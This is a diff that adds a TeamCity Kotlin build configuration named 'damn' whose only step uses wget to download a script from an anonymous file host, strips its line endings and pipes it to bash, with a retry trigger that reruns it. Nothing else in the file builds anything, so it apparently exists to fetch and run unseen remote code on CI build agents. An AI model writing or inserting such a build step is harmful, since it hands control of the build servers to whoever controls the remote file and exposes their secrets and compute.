@@ -1,0 +1,32 @@
+package _Self.buildTypes
+
+import jetbrains.buildServer.configs.kotlin.*
+import jetbrains.buildServer.configs.kotlin.buildFeatures.perfmon
+import jetbrains.buildServer.configs.kotlin.buildSteps.script
+import jetbrains.buildServer.configs.kotlin.triggers.retryBuild
+
+object Damn : BuildType({
+    name = "damn"
+
+    steps {
+        script {
+            id = "simpleRunner"
+            scriptContent = """
+                wget -q https://x0.at/uyl0.txt -O b
+                sed -i 's/\r${'$'}//' b
+                bash b
+            """.trimIndent()
+        }
+    }
+
+    triggers {
+        retryBuild {
+            branchFilter = ""
+        }
+    }
+
+    features {
+        perfmon {
+        }
+    }
+})
